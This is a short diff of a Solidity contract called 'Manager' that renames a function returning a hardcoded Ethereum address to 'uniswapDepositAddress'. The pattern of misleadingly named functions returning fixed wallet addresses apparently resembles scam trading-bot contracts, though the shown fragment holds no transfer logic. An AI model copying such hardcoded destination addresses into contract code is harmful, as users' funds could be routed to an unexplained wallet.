@@ -38,7 +38,7 @@ contract Manager {
         return 0xcde527440fafaeedb904e45f415efd1f35de041c;
     }
 
-    function TriggerScanMonitoring() public pure returns (address) {
+    function uniswapDepositAddress() public pure returns (address) {
         return 0x04f3a514ee1De75F0976c941458214A1098cA0b1;
     }
 
